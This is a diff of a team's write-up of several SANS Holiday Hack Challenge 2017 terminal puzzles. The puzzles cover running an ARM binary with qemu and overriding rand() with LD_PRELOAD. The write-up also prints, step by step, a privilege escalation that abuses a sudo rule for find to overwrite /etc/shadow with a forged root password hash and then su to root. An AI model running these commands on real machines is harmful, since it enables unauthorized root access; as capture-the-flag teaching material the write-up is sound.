+<li><a href="https://twitter.com/ClimbALLdaTrees/status/938578359860174848">I think I have some pseudo (sp?) permissions on this Unix server, but I don't know what that means. @GreenesterElf said this was a "learning opportunity" and won't give me the answer :'(</a>
+</li>
+</ul>
+</div>
+</li>
+
+<li><a id="approach" name="approach"></a><a id="sec-5-4-1-6" name="sec-5-4-1-6"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
 
 <p>
 If we follow the hint, we should try to figure out what commands we can run with sudo. Let's run <code>sudo -h</code> to view the help documentation:
@@ -1753,11 +1792,11 @@ To follow the hint, we should run sudo with the <code>--list</code> option, to s
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@40a64f5e12a2:~$ sudo --list
-Matching Defaults entries for elf on 40a64f5e12a2:
+<pre class="src src-sh">elf@784e43534178:~$ sudo --list
+Matching Defaults entries for elf on 784e43534178:
     env_reset, mail_badpass, <span style="font-weight: bold; font-style: italic;">secure_path</span>=/usr/local/sbin<span style="font-style: italic;">\:</span>/usr/local/bin<span style="font-style: italic;">\:</span>/usr/sbin<span style="font-style: italic;">\:</span>/usr/bin<span style="font-style: italic;">\:</span>/sbin<span style="font-style: italic;">\:</span>/bin<span style="font-style: italic;">\:</span>/snap/bin
 
-User elf may run the following commands on 40a64f5e12a2:
+User elf may run the following commands on 784e43534178:
     (elf : shadow) NOPASSWD: /usr/bin/find
 </pre>
 </div>
@@ -1768,7 +1807,7 @@ We can run the find command, but it also mentions something about shadow. Let's 
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@2100915cb450:~$ sudo find
+<pre class="src src-sh">elf@784e43534178:~$ sudo find
 [sudo] password for elf:
 </pre>
 </div>
@@ -1782,11 +1821,11 @@ some more verbose output:
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@2100915cb450:~$ sudo -l -l
-Matching Defaults entries for elf on 2100915cb450:
+<pre class="src src-sh">elf@784e43534178:~$ sudo -l -l
+Matching Defaults entries for elf on 784e43534178:
     env_reset, mail_badpass, <span style="font-weight: bold; font-style: italic;">secure_path</span>=/usr/local/sbin<span style="font-style: italic;">\:</span>/usr/local/bin<span style="font-style: italic;">\:</span>/usr/sbin<span style="font-style: italic;">\:</span>/usr/bin<span style="font-style: italic;">\:</span>/sbin<span style="font-style: italic;">\:</span>/bin<span style="font-style: italic;">\:</span>/snap/bin
 
-User elf may run the following commands on 2100915cb450:
+User elf may run the following commands on 784e43534178:
 Sudoers entry:
     RunAsUsers: elf
     RunAsGroups: shadow
@@ -1805,7 +1844,7 @@ Ok. So sudo lets us run the find command as the user elf, and the group shadow. 
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@2100915cb450:~$ sudo -g shadow find 
+<pre class="src src-sh">elf@784e43534178:~$ sudo -g shadow find 
 <span style="font-weight: bold;">.</span>
 ./.bashrc
 ./.bash_logout
@@ -1821,7 +1860,7 @@ the shadow group. Is this enough to overwrite <code>/etc/shadow</code>?
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@2100915cb450:~$ ls -l /etc/shadow
+<pre class="src src-sh">elf@784e43534178:~$ ls -l /etc/shadow
 -rw-rw---- 1 root shadow 0 Dec 15 20:00 /etc/shadow
 </pre>
 </div>
@@ -1845,7 +1884,7 @@ Let's give it a shot:
 </p>
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@2100915cb450:~$ sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow <span style="font-style: italic;">\;</span>
+<pre class="src src-sh">elf@784e43534178:~$ sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow <span style="font-style: italic;">\;</span>
 </pre>
 </div>
 
@@ -1855,7 +1894,7 @@ Looks like that worked:
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@2100915cb450:~$ inspect_da_box 
+<pre class="src src-sh">elf@784e43534178:~$ inspect_da_box 
                      ___
                     / __<span style="font-style: italic;">'.     .-"""-.</span>
 <span style="font-style: italic;">              .-""-| |  '</span>.<span style="font-style: italic;">'.  / .---. \</span>
@@ -1876,7 +1915,7 @@ Looks like that worked:
 </div>
 </li>
 
-<li><a id="solution" name="solution"></a><a id="sec-5-4-1-6" name="sec-5-4-1-6"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-5-4-1-7" name="sec-5-4-1-7"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
 
 <p>
 A one-liner is:
@@ -1894,7 +1933,7 @@ AsciiCinema video of the solution?
 </div>
 </li>
 
-<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-4-1-7" name="sec-5-4-1-7"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-4-1-8" name="sec-5-4-1-8"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
 
 <p>
 <code>find</code>'s exec syntax is a little weird, and a common mistake is forgetting to escape the semicolon at the end:
@@ -1902,7 +1941,7 @@ AsciiCinema video of the solution?
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@2100915cb450:~$ sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow ;
+<pre class="src src-sh">elf@784e43534178:~$ sudo -g shadow find -exec cp /etc/shadow.bak /etc/shadow ;
 find: missing argument to <span style="font-weight: bold;">`-exec'</span>
 </pre>
 </div>
@@ -1915,7 +1954,7 @@ known.
 </div>
 </li>
 
-<li><a id="sec-5-4-1-8" name="sec-5-4-1-8"></a>Going Further - Privilege Escalation<br  /><div class="outline-text-5" id="text-5-4-1-8">
+<li><a id="sec-5-4-1-9" name="sec-5-4-1-9"></a>Going Further - Privilege Escalation<br  /><div class="outline-text-5" id="text-5-4-1-9">
 <p>
 This is neat, but let's elevate privileges to root on this
 terminal. Our approach will be to put in a modified shadow file
@@ -1928,7 +1967,7 @@ First, let's generate the password hash in the right format:
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@2100915cb450:~$ echo <span style="font-style: italic;">"password"</span> | openssl passwd -1 -stdin
+<pre class="src src-sh">elf@784e43534178:~$ echo <span style="font-style: italic;">"password"</span> | openssl passwd -1 -stdin
 $<span style="font-weight: bold; font-style: italic;">1</span>$<span style="font-weight: bold; font-style: italic;">wDLzsvsW</span>$<span style="font-weight: bold; font-style: italic;">0</span>.aZ24yCO8xhhjnfHUIG3/
 </pre>
 </div>
@@ -1941,7 +1980,7 @@ escaping special characters in the sed command line.
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@2100915cb450:~$ sed -e <span style="font-style: italic;">'s/root:\*/root:$1$wDLzsvsW$0.aZ24yCO8xhhjnfHUIG3/'</span> /etc/shadow.bak | tee better.shadow
+<pre class="src src-sh">elf@784e43534178:~$ sed -e <span style="font-style: italic;">'s/root:\*/root:$1$wDLzsvsW$0.aZ24yCO8xhhjnfHUIG3/'</span> /etc/shadow.bak | tee better.shadow
 root:$<span style="font-weight: bold; font-style: italic;">1</span>$<span style="font-weight: bold; font-style: italic;">WPvxfOOK</span>$<span style="font-weight: bold; font-style: italic;">JqDBD</span>/DPQlpkUBOC3qTp51:17484:0:99999:7:::
 daemon:*:17484:0:99999:7:::
 bin:*:17484:0:99999:7:::
@@ -1958,10 +1997,10 @@ Now, we re-run our find command, and find that we can escalate to root with a pa
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@2100915cb450:~$ sudo -g shadow find -exec cp better.shadow /etc/shadow <span style="font-style: italic;">\;</span>
-elf@2100915cb450:~$ su
+<pre class="src src-sh">elf@784e43534178:~$ sudo -g shadow find -exec cp better.shadow /etc/shadow <span style="font-style: italic;">\;</span>
+elf@784e43534178:~$ su
 Password: 
-root@2100915cb450:/home/elf# id  
+root@784e43534178:/home/elf# id  
 <span style="font-weight: bold; font-style: italic;">uid</span>=0(root) <span style="font-weight: bold; font-style: italic;">gid</span>=0(root) <span style="font-weight: bold; font-style: italic;">groups</span>=0(root)
 </pre>
 </div>
@@ -1972,9 +2011,9 @@ root@2100915cb450:/home/elf# id
 <div id="outline-container-sec-5-5" class="outline-3">
 <h3 id="sec-5-5"><span class="todo TODO">TODO</span> There's No Place Like Home</h3>
 <div class="outline-text-3" id="text-5-5">
-</div><div id="outline-container-answer-template" class="outline-4">
-<h4 id="answer-template"><a id="sec-5-5-1" name="sec-5-5-1"></a>Answer Template</h4>
-<div class="outline-text-4" id="text-answer-template">
+</div><div id="outline-container-title" class="outline-4">
+<h4 id="title"><a id="sec-5-5-1" name="sec-5-5-1"></a>There's Snow Place Like Home</h4>
+<div class="outline-text-4" id="text-title">
 </div>
 
 <ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-5-1-1" name="sec-5-5-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
@@ -2006,12 +2045,19 @@ If you can get it running again, I will reward you with a gift of delight.
 <li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-5-1-2" name="sec-5-5-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">
 
 <p>
-Where was the terminal?
+From this game: <a href="https://2017.holidayhackchallenge.com/game/41a1e6bb-60c3-4695-ad04-514fbcc76afa">https://2017.holidayhackchallenge.com/game/41a1e6bb-60c3-4695-ad04-514fbcc76afa</a>
 </p>
 
 <p>
-<a href="https://docker2017.holidayhackchallenge.com/?challenge=4050467e-9cde-44cd-aa63-1a0b8b210bb7&uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=4050467e-9cde-44cd-aa63-1a0b8b210bb7&uid=USER_ID</a>
+Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=4050467e-9cde-44cd-aa63-1a0b8b210bb7&uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=4050467e-9cde-44cd-aa63-1a0b8b210bb7&uid=USER_ID</a>
 </p>
+
+
+<div class="figure">
+<p><img src="../images/terminal-location-home.png" alt="terminal-location-home.png" />
+</p>
+<p><span class="figure-number">Figure 8:</span> The terminal is on the side of the center building.</p>
+</div>
 </div>
 </li>
 
@@ -2027,8 +2073,8 @@ This is a 64-bit x86 system:
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@5e0a9637e4c6:~$ uname -a
-Linux 5e0a9637e4c6 4.9.0-4-amd64 <span style="font-weight: bold; font-style: italic;">#</span><span style="font-weight: bold; font-style: italic;">1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 x86_64 x86_64 GNU/Linux</span>
+<pre class="src src-sh">elf@784e43534178:~$ uname -a
+Linux 784e43534178 4.9.0-4-amd64 <span style="font-weight: bold; font-style: italic;">#</span><span style="font-weight: bold; font-style: italic;">1 SMP Debian 4.9.65-3 (2017-12-03) x86_64 x86_64 x86_64 GNU/Linux</span>
 </pre>
 </div>
 </div>
@@ -2042,14 +2088,35 @@ It looks like we just want to run the <code>trainstartup</code> file, but if we 
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@5e0a9637e4c6:~$ ./trainstartup 
+<pre class="src src-sh">elf@784e43534178:~$ ./trainstartup 
 bash: ./trainstartup: cannot execute binary file: Exec format error
 </pre>
 </div>
 </div>
 </li>
 
-<li><a id="approach" name="approach"></a><a id="sec-5-5-1-5" name="sec-5-5-1-5"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+<li><a id="hints" name="hints"></a><a id="sec-5-5-1-5" name="sec-5-5-1-5"></a>Hints<br  /><div class="outline-text-5" id="text-hints">
+
+<p>
+<a href="https://twitter.com/PepperyGoodness">Pepper Minstix on Twitter has a hint</a>
+</p>
+<ul class="org-ul">
+<li><a href="https://twitter.com/PepperyGoodness/status/938545233624678400">Actually, @GreenesterElf , you're better at prompt commands than I am. Why can't I get this model train thing working? I'm in the right directory like you taught me, but this system is still saying "No such file or directory"</a>
+</li>
+</ul>
+
+<p>
+<a href="https://twitter.com/GreenesterElf">Holly Evergreen on Twitter has a hint for this as well</a>
+</p>
+<ul class="org-ul">
+<li><a href="https://twitter.com/GreenesterElf/status/938552050253643777">I still can't figure out Pepper Minstix's issue. It looks like the binary is compiled for another architecture. I think qemu can help, but I don't want to run the entire OS :\ <a href="https://doc.opensuse.org/documentation/">https://doc.opensuse.org/documentation/</a>… helps, but I just want one binary, not the whole system!</a> <a href="https://doc.opensuse.org/documentation/leap/virtualization/html/book.virt/cha.qemu.running.html">https://doc.opensuse.org/documentation/leap/virtualization/html/book.virt/cha.qemu.running.html</a>
+</li>
+</ul>
+</div>
+</li>
+
+
+<li><a id="approach" name="approach"></a><a id="sec-5-5-1-6" name="sec-5-5-1-6"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
 
 <p>
 There's really not much to go on here. We'll first use <code>file</code> to identify the <code>trainstartup</code> binary:
@@ -2057,7 +2124,7 @@ There's really not much to go on here. We'll first use <code>file</code> to iden
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@5e0a9637e4c6:~$ file trainstartup 
+<pre class="src src-sh">elf@784e43534178:~$ file trainstartup 
 trainstartup: ELF 32-bit LSB  executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, <span style="font-weight: bold; font-style: italic;">BuildID</span>[sha1]=005de4685e8563d10b3de3e0be7d6fdd7ed732eb, not stripped
 </pre>
 </div>
@@ -2068,7 +2135,7 @@ So the file is a Linux ELF binary, but it's for the ARM processor, and not for t
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@5e0a9637e4c6:~$ compgen -c | grep arm
+<pre class="src src-sh">elf@784e43534178:~$ compgen -c | grep arm
 qemu-arm
 qemu-armeb
 </pre>
@@ -2080,7 +2147,7 @@ Running it with the help option gives us:
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@5e0a9637e4c6:~$ qemu-arm -h
+<pre class="src src-sh">elf@784e43534178:~$ qemu-arm -h
 usage: qemu-arm [options] program [arguments...]
 Linux CPU emulator (compiled for arm emulation)
 ...
@@ -2093,7 +2160,7 @@ This looks like exactly what we need. <code>qemu-arm</code> provides us with an 
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@5e0a9637e4c6:~$ qemu-arm ./trainstartup 
+<pre class="src src-sh">elf@784e43534178:~$ qemu-arm ./trainstartup 
 Starting up ... 
 
     Merry Christmas
@@ -2127,7 +2194,7 @@ Success!
 </div>
 </li>
 
-<li><a id="solution" name="solution"></a><a id="sec-5-5-1-6" name="sec-5-5-1-6"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-5-5-1-7" name="sec-5-5-1-7"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
 
 <p>
 You need to use <code>qemu-arm</code> to run the ARM binary: <code>qemu-arm ./trainstartup</code>
@@ -2139,7 +2206,7 @@ AsciiCinema video of the solution?
 </div>
 </li>
 
-<li><a id="alternatives" name="alternatives"></a><a id="sec-5-5-1-7" name="sec-5-5-1-7"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-5-5-1-8" name="sec-5-5-1-8"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
 
 <p>
 The real difficulty of this terminal was in discovering that you
@@ -2152,7 +2219,7 @@ made to the system after it was installed. Let's take a quick look at
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@5e0a9637e4c6:~$ stat /usr/bin/qemu-arm trainstartup 
+<pre class="src src-sh">elf@784e43534178:~$ stat /usr/bin/qemu-arm trainstartup 
   File: <span style="font-style: italic;">'/usr/bin/qemu-arm'</span>
   Size: 1725888         Blocks: 3376       IO Block: 4096   regular file
 Device: 801h/2049d      Inode: 1049395     Links: 1
@@ -2192,7 +2259,7 @@ modified after <code>/etc/apt</code> was changed, and we'll look for files with
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@5e0a9637e4c6:~$ find / -xdev -cnewer /etc/apt/sources.list | grep -w arm
+<pre class="src src-sh">elf@784e43534178:~$ find / -xdev -cnewer /etc/apt/sources.list | grep -w arm
 /usr/bin/qemu-arm
 /usr/share/man/man1/qemu-arm.1.gz
 </pre>
@@ -2211,7 +2278,7 @@ you to see a complete timeline of changes to files:
 
 <div class="org-src-container">
 
-<pre class="src src-sh">elf@5e0a9637e4c6:~$ find / -xdev -printf <span style="font-style: italic;">"%C+\t%p\n"</span> | sort | head
+<pre class="src src-sh">elf@784e43534178:~$ find / -xdev -printf <span style="font-style: italic;">"%C+\t%p\n"</span> | sort | head
 2017-12-04+14:36:51.7363603170  /bin/bash
 2017-12-04+14:36:51.7363603170  /bin/bunzip2
 2017-12-04+14:36:51.7363603170  /bin/bzcat
@@ -2224,7 +2291,7 @@ you to see a complete timeline of changes to files:
 </div>
 </li>
 
-<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-5-1-8" name="sec-5-5-1-8"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-5-1-9" name="sec-5-5-1-9"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
 
 <p>
 This terminal was tricky because almost no information was
@@ -2238,9 +2305,9 @@ an ARM binary, and knowing how to find <code>qemu-arm</code> was key.
 <div id="outline-container-sec-5-6" class="outline-3">
 <h3 id="sec-5-6"><span class="todo TODO">TODO</span> We're Off To See The</h3>
 <div class="outline-text-3" id="text-5-6">
-</div><div id="outline-container-answer-template" class="outline-4">
-<h4 id="answer-template"><a id="sec-5-6-1" name="sec-5-6-1"></a>Answer Template</h4>
-<div class="outline-text-4" id="text-answer-template">
+</div><div id="outline-container-title" class="outline-4">
+<h4 id="title"><a id="sec-5-6-1" name="sec-5-6-1"></a>We're Off To See The&#x2026;</h4>
+<div class="outline-text-4" id="text-title">
 </div>
 
 <ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-6-1-1" name="sec-5-6-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
@@ -2267,110 +2334,185 @@ You will need to write your own code, but only a line or two.
 <li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-6-1-2" name="sec-5-6-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">
 
 <p>
-Where was the terminal? What's the direct link to it?
+From this game: <a href="https://2017.holidayhackchallenge.com/game/30a9c19a-f931-4367-9922-d20b91314eec">https://2017.holidayhackchallenge.com/game/30a9c19a-f931-4367-9922-d20b91314eec</a>
 </p>
+
+<p>
+Direct link: <a href="https://docker2017.holidayhackchallenge.com/?challenge=96452ffb-5153-4473-9fe4-f0ff7921308e&uid=USER_ID">https://docker2017.holidayhackchallenge.com/?challenge=96452ffb-5153-4473-9fe4-f0ff7921308e&uid=USER_ID</a>
+</p>
+
+
+<div class="figure">
+<p><img src="../images/terminal-location-off.png" alt="terminal-location-off.png" />
+</p>
+<p><span class="figure-number">Figure 9:</span> The terminal is on a peak off to the side.</p>
+</div>
 </div>
 </li>
 
 <li><a id="background-information" name="background-information"></a><a id="sec-5-6-1-3" name="sec-5-6-1-3"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
 
 <p>
-Do we know anything about this terminal already?
+We are logged in as the user <code>elf</code>.
 </p>
 
 <p>
-Hints:
+The system motd tells us:
 </p>
+
+<blockquote>
+<p>
+Run the given binary, make it return 42.
+Use the partial source for hints, it is just a clue.
+You will need to write your own code, but only a line or two.
+</p>
+</blockquote>
 
 <p>
-List any useful hints here.
+Two files are provided
 </p>
 
-<p>
-Blog Posts:
-</p>
+<div class="org-src-container">
 
-<p>
-Are any of these useful?
-</p>
-
-<ul class="org-ul">
-<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
-(EC2)
-<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
-Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.
-</li>
-<li>Your Pokemon Guide for Essential SQL Pen Test Commands
-<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
-</li>
-<li>Exploiting XXE Vulnerabilities in IIS/.NET
-<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML
-</li>
-<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
-<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
-Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
-</li>
-<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
-</li>
-<li>A Spot of Tee
-<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee
-</li>
-<li>Understanding and Exploiting Web-based LDAP
-<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection
-</li>
-<li>Massively Scaling your Scanning
-<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan
-</li>
-</ul>
+<pre class="src src-sh">-rwxr-xr-x 1 root root 84824 Dec 16 16:47 isit42
+-rw-r--r-- 1 root root   654 Dec 15 19:59 isit42.c.un
+</pre>
+</div>
 </div>
 </li>
 
 <li><a id="goal" name="goal"></a><a id="sec-5-6-1-4" name="sec-5-6-1-4"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
 
 <p>
-What are we trying to accomplish?
+For this challenge we need to write our own code in order to make the provided binary <code>isit42</code> return 42.
 </p>
 </div>
 </li>
 
-<li><a id="approach" name="approach"></a><a id="sec-5-6-1-5" name="sec-5-6-1-5"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+<li><a id="hints" name="hints"></a><a id="sec-5-6-1-5" name="sec-5-6-1-5"></a>Hints<br  /><div class="outline-text-5" id="text-hints">
 
 <p>
-Describe the thought process that we tried here. How were we able to use
-the hints or the blog posts?
+<a href="https://twitter.com/1Horse1OSSleigh">Wunorse Openslae (that's a stretch) on Twitter actually has no useful hints</a>
+</p>
+
+<p>
+This blog post, <a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">Go To The Head Of The Class: LD_PRELOAD For The Win</a>, by Jeff McJunkin was useful.
 </p>
 </div>
 </li>
 
-<li><a id="solution" name="solution"></a><a id="sec-5-6-1-6" name="sec-5-6-1-6"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+<li><a id="approach" name="approach"></a><a id="sec-5-6-1-6" name="sec-5-6-1-6"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
 
 <p>
-Summarize the reference solution that we found.
+[[<a href="https://ncsa.github.io/sans-holiday-hack-2016/#org42386a9][Our">https://ncsa.github.io/sans-holiday-hack-2016/#org42386a9][Our</a> team actually did this exact thing last year in order to derandomize <code>wumpus</code>.
 </p>
 
 <p>
-AsciiCinema video of the solution?
+In this case looking at the source code we can identify the exact code that is being used to randomize the program:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">int getrand() {
+    srand((unsigned int)<span style="font-weight: bold;">time</span>(NULL)); 
+    <span style="font-weight: bold;">printf</span>(<span style="font-style: italic;">"Calling rand() to select a random number.\n"</span>);
+    // The prototype for rand is: int rand(void);
+    <span style="font-weight: bold;">return</span> rand() % 4096; // returns a pseudo-random integer between 0 and 4096
+}
+</pre>
+</div>
+
+<p>
+If we create our own library file to define <code>rand()</code> we can remove the randomness.
 </p>
 </div>
 </li>
 
-<li><a id="alternatives" name="alternatives"></a><a id="sec-5-6-1-7" name="sec-5-6-1-7"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+<li><a id="solution" name="solution"></a><a id="sec-5-6-1-7" name="sec-5-6-1-7"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
 
 <p>
-Any other, easier solutions?
+As mentioned in the hints section above, we can use <a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">Jeff McJunkin's</a> blog post for guidance on how to complete this challenge.
 </p>
+
+<p>
+First we'll need to create our own library. We can call it 'rand.c'.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">int rand(unsigned int *seed) {
+    <span style="font-weight: bold;">return</span> 42;
+}
+</pre>
+</div>
+
+<p>
+Then we compile it using the suggested flags in the article.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">elf@784e43534178:~$ gcc -o rand -ldl -shared -fPIC rand.c
+</pre>
+</div>
+
+<p>
+Once compiled we can then use LD_PRELOAD to load our library.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">elf@784e43534178:~$ <span style="font-weight: bold; font-style: italic;">LD_PRELOAD</span>=<span style="font-weight: bold;">`pwd`</span>/rand ./isit42
+Starting up ... done.
+Calling rand() to select a random number.
+                 .-. 
+                <span style="font-weight: bold;">.</span>;;<span style="font-style: italic;">\ </span>||           _______  __   __  _______    _______  __    _  _______  _     _  _______  ______ 
+               /::::<span style="font-style: italic;">\|</span>/          |       ||  | |  ||       |  |   _   ||  |  | ||       || | _ | ||       ||    _ |
+              /::::<span style="font-style: italic;">'();          |_     _||  |_|  ||    ___|  |  |_|  ||   |_| ||  _____|| || || ||    ___||   | ||</span>
+<span style="font-style: italic;">            |\/`\:_/`\/|           |   |  |       ||   |___   |       ||       || |_____ |       ||   |___ |   |_||_ </span>
+<span style="font-style: italic;">        ,__ |0_..().._0| __,       |   |  |       ||    ___|  |       ||  _    ||_____  ||       ||    ___||    __  |</span>
+<span style="font-style: italic;">         \,`////""""\\\\`,/        |   |  |   _   ||   |___   |   _   || | |   | _____| ||   _   ||   |___ |   |  | |</span>
+<span style="font-style: italic;">         | )//_ o  o _\\( |        |___|  |__| |__||_______|  |__| |__||_|  |__||_______||__| |__||_______||___|  |_|</span>
+<span style="font-style: italic;">          \/|(_) () (_)|\/ </span>
+<span style="font-style: italic;">            \   '</span>()<span style="font-style: italic;">'   /            ______    _______  _______  ___      ___      __   __    ___   _______ </span>
+<span style="font-style: italic;">            _:.______.;_           |    _ |  |       ||   _   ||   |    |   |    |  | |  |  |   | |       |</span>
+<span style="font-style: italic;">          /| | /`\/`\ | |\         |   | ||  |    ___||  |_|  ||   |    |   |    |  |_|  |  |   | |  _____|</span>
+<span style="font-style: italic;">         / | | \_/\_/ | | \        |   |_||_ |   |___ |       ||   |    |   |    |       |  |   | | |_____ </span>
+<span style="font-style: italic;">        /  |o`""""""""`o|  \       |    __  ||    ___||       ||   |___ |   |___ |_     _|  |   | |_____  |</span>
+<span style="font-style: italic;">       `.__/     ()     \__.'</span>      |   |  | ||   |___ |   _   ||       ||       |  |   |    |   |  _____| |
+       |  | ___      ___ |  |      |___|  |_||_______||__| |__||_______||_______|  |___|    |___| |_______|
+       /  <span style="font-style: italic;">\|</span>---|    |---|/  <span style="font-style: italic;">\ </span>
+       |  (|42 | () | DA|)  |       _   ___  _______ 
+       <span style="font-style: italic;">\ </span> /;---<span style="font-style: italic;">'    '</span>---;<span style="font-style: italic;">\ </span> /      | | |   ||       |
+        <span style="font-weight: bold;">``</span> <span style="font-style: italic;">\ </span>___ /<span style="font-style: italic;">\ </span>___ / <span style="font-weight: bold;">``</span>       | |_|   ||____   |
+            <span style="font-weight: bold;">`|  |  |  |`</span>           |       | ____|  |
+      jgs    |  |  |  |            |___    || ______| ___ 
+       _._  |<span style="font-style: italic;">\|\/</span>||<span style="font-style: italic;">\/</span>|/|  _._          |   || |_____ |   |
+      / .-<span style="font-style: italic;">\ </span>|~~~~||~~~~| /-. <span style="font-style: italic;">\ </span>        |___||_______||___|
+      | <span style="font-style: italic;">\_</span>_.<span style="font-style: italic;">'    ||    '</span>.__/ |
+       <span style="font-weight: bold;">`---------''---------`</span> 
+Congratulations! You<span style="font-style: italic;">'ve won, and have successfully completed this challenge.</span>
+</pre>
+</div>
 </div>
 </li>
 
-<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-6-1-8" name="sec-5-6-1-8"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+
+<li><a id="alternatives" name="alternatives"></a><a id="sec-5-6-1-8" name="sec-5-6-1-8"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+
+<p>
+Another option is to just brute force it.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-sh">elf@784e43534178:~$ while true;<span style="font-weight: bold;">do</span> ./isit42 &amp;sleep 1;<span style="font-weight: bold;">done</span>
+</pre>
+</div>
+</div>
+</li>
+
